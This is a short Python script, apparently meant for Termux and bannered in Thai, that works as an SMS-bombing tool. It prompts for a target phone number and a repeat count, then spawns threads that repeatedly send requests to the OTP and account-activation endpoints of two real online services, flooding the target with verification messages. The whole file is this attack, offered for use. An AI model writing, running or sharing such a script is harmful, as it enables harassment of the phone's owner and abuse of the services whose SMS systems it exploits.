import requests
import os
import time
import threading
from threading import Thread
os.system("clear") # ในวงเล็บคืคำสั่งใน Termux
print("scriptf freeกากๆ")
print("")
print("1api")
print("")
print("credit.YT;AIMBOT")
print("")
print("remake by.KID")
phone = input("number : ")
num = int(input("target : "))
print("")
os.system("clear")
def test(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print("waiting◉")
	
def test2():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("waiting◉")
	
	
for i in range(num):
	time.sleep(1)
	threading.Thread(target=test).start()
	threading.Thread(target=test2).start()